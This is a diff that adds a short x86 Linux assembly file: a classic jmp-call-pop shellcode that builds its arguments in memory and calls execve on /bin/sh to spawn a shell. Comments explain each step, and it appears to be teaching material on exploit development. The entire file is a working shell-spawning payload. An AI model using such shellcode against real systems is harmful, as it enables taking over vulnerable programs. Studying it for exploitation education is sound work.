@@ -1,0 +1,25 @@
+Section .text
+
+  global _start
+
+_start:
+
+  jmp short     callShellcode   ;jump to callShellcode 
+
+shellcode:
+
+  pop           esi   ; esi now represents the location of our string 
+  xor           eax, eax ; make eax 0    
+  mov byte      [esi + 7], al ; terminate /bin/sh 
+  lea           ebx, [esi] ; get the adress of /bin/sh and put it in register ebx, which is our variable one
+  mov long      [esi + 8], ebx ; put the value of ebx(the address of /bin/sh) in AAAA ([esi +8])
+  lea           ecx, [esi + 8] ; argument two, our pointer to /bin/sh
+  mov long      [esi + 12], eax; put NULL in BBBB (remember xor eax, eax) 
+  lea           edx, [esi + 12]; argument three, our pointer to NULL
+  mov byte      al, 0x0b ;0x0b which represents execve
+  int           0x80 ; interrupt sys which executes the command
+
+callShellcode:
+
+  Call          shellcode    
+  db            '/bin/shNAAAABBBB' ;call shellcode and push bin... on the stack.
